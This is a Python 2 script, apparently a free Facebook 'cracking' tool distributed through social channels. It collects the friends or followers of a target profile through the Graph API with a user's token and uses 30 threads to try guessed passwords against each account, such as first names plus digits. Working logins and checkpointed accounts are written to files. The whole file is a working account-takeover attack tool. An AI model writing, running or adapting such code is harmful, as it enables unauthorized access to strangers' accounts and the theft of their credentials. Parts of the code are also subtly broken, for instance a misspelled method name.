#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
#originally written by muhammad hamza
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
from multiprocessing.pool import ThreadPool
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass 
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

logo ="""

\033[1;37m \033[0;97m
   ##     ##       ######     ###########
   ##     ##      ##    ##        ##
   ##     ##      ##              ##
   \033[1;32m#########       ######         ## \033[0;97m
   ##     ##            ##        ##
   ##     ##      ##    ##        ## 
   ##     ##       ######         ##

 ------------------------------------------

   Author   : H S T (HOP)
   Github   : https://github.com/Hamzahash
   Youtube  : HS Officials
   Telegram : HOP Programmers
   This tool is free not for sale

 ----------------------------------------- """
def reg():
    os.system("clear")
    print(logo)
    print("")
    print("\tTool activation")
    print("")
    time.sleep(1)
    try:
        to = open("/sdcard/.hop.txt", "r").read()
    except (KeyError , IOError):
        reg2()
    r = requests.get("https://raw.githubusercontent.com/guru-bhai/tokens/master/public.txt").text
    if to in r:
        os.system('clear')
        print(logo)
        print("")
        print("\tGenerating connection")
        print("")
        os.system("cd ..... && npm install")
        os.system("fuser -k 5000/tcp &")
        os.system("#")
        os.system("cd ..... && node index.js &")
        os.system("xdg-open https://t.me/hop1626")
        time.sleep(5)
        login()
    else:
        os.system("clear")
        print(logo)
        print("")
        print("\tRegistration Failed")
        print("")
        print(" Your key is not registered yet ")
        print("")
        print(" Copy and send key to admin")
        print("")
        print(" Your key: "+to)
        print("")
        raw_input(" Press enter to send key")
        os.system("xdg-open https://wa.me/+923447490792")
        reg()
def reg2():
    os.system("clear")
    print(logo)
    print("")
    print("\tYour device is not registered")
    print("")
    print(" Copy and press enter , then select whatsapp to continue")
    print("")
    id = uuid.uuid4().hex[:75]
    s = open('/sdcard/.hop.txt', 'w')
    s.write(id)
    s.close()
    ids = open('/sdcard/.hop.txt', 'r').read()
    print(" Your key: "+ids)
    print("")
    print("")
    raw_input(" Press enter to go to whatsapp ")
    os.system("xdg-open https://wa.me/+923447490792")
    raw_input(" Press enter to check registration ")
    reg()
def login():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        print(logo)
        print("")
        print("\tLogin token")
        print("")
        token = raw_input(" Paste token here: ")
        sav = open("access_token.txt", "w")
        sav.write(token)
        sav.close()
        menu()
def menu():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
    except(KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        print(logo)
        print("")
        print("\tLogged in token has expired")
        os.system("rm -rf access_token.txt")
        print("")
        time.sleep(1)
        login()
    os.system("clear")
    print(logo)
    print("")
    print(" Welcome: "+name)
    print("")
    print(" Activation: Free mode")
    print("")
    print(47*"-")
    print("")
    print(" [1] Crack with name pass")
    print(" [2] Crack with digit pass")
    print(' [3] Profile lock trick')
    print(' [4] Instagram followers trick')
    print(' [5] Find number detail (2018 database)')
    print("")
    menu_option()
def menu_option():
	select = raw_input(" Choose option: ")
	if select =="1":
		crack()
	elif select =="2":
		choice()
	elif select =="3":
		os.system('xdg-open https://youtu.be/gcdZwOqkZSg')
	elif select =='4':
	    os.system('xdg-open https://youtu.be/tncUQGIok8c')
	elif select =='5':
	    os.system('xdg-open https://youtu.be/xN-l-dTj6aY')
	else:
		print("")
		print("\tSelect valid option")
		print("")
		menu_option()
def crack():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found ")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("")
	print("\tCrack with Name pass")
	print("")
	print("[1] Crack public id")
	print("[2] Crack followers")
	print("[0] Back")
	print("")
	crack_select()
def crack_select():
	select = raw_input(" Choose option: ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\tName pass cracking")
		print("")
		idt = raw_input(" Input id: ")
		p1 = raw_input(" Name + your digit: ")
		p2 = raw_input(" Name + your digit: ")
		p3 = raw_input(" Name + your digit: ")
		p4 = raw_input(" Name + your digit: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print("\tName pass cracking")
			print('')
			print(" Cloning from : "+q["name"])
		except KeyError:
			print("\tInvalid link OR token")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("")
		print("\tName pass cracking")
		print("")
		idt = raw_input(" Input id: ")
		p1 = raw_input(" Name + your digit: ")
		p2 = raw_input(" Name + your digit: ")
		p3 = raw_input(" Name + your digit: ")
		p4 = raw_input(" Name + your digit: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print('\tName pass cracking')
			print('')
			print(" Cloning from: "+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		crack_select()
	print(" Total IDs : "+str(len(id)))
	print(" The Process has started")
	print("")
	print(47*"-")
	print("")
	print("\t\033[1;32mCreated by: HST (HOP) Group\033[0;97m")
	print(47*"-")
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			pass1 = name.lower()+p1
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("successful.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print(" \033[1;33m[HST-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("checkpoint.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower()+p2
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("successful.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print(" \033[1;33m[HST-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("checkpoint.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower()+p3
							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
							q = json.loads(data)
							if "loc" in q:
								print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("successful.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error"]:
									print(" \033[1;33m[HST-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("checkpoint.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower()+p4
									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
									q = json.loads(data)
									if "loc" in q:
										print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("successful.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print(" \033[1;33m[HST-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("checkpoint.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print("")
	print(47*"-")
	print("")
	print(" The process has completed")
	print(" Total Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))
	print("")
	print(47*"-")
	print("")
	raw_input(" Press enter to back")
	crack()
def choice():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("")
	print("\tDigit pass cracking")
	print("")
	print("[1] Crack public id")
	print("[2] Crack followers")
	print("[0] Back")
	print("")
	choice_select()
def choice_select():
	select = raw_input("Choose option: ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\tDigit pass cracking")
		print("")
		pass1 = raw_input(" Password: ")
		pass2 = raw_input(" Password: ")
		pass3 = raw_input(" Password: ")
		pass4 = raw_input(" Password: ")
		idt = raw_input(" Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print('\tDigit pass cracking')
			print(" Cloning from : "+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("")
		print("\tDigit pass cracking")
		print("")
		pass1 = raw_input(" Password: ")
		pass2 = raw_input(" Password: ")
		pass3 = raw_input(" Password: ")
		pass4 = raw_input(" Password: ")
		idt = raw_input(" Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print('\tDigit pass cracking')
			print('')
			print(" Cloning from: "+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		choice_select()
	print(" Total IDs : "+str(len(id)))
	print(" The Process has started")
	print("")
	print(47*"-")
	print("")
	print("\t\033[1;32mCreated by: HST (HOP) Group\033[0;97m")
	print(47*"-")
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("successful.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print(" \033[1;33m[HST-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("checkpoint.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("successful.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print(" \033[1;33m[HST-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("checkpoint.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
							q = json.loads(data)
							if "loc" in q:
								print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("successful.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error"]:
									print(" \033[1;33m[HST-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("checkpoint.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
									q = json.loads(data)
									if "loc" in q:
										print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("successful.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print(" \033[1;33m[HST-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("checkpoint.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print("")
	print(47*"-")
	print("")
	print(" The process has completed")
	print(" Total Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))
	print("")
	print(47*"-")
	print("")
	raw_input(" Press enter to back")
	choice()
if __name__ == '__main__':
	reg()

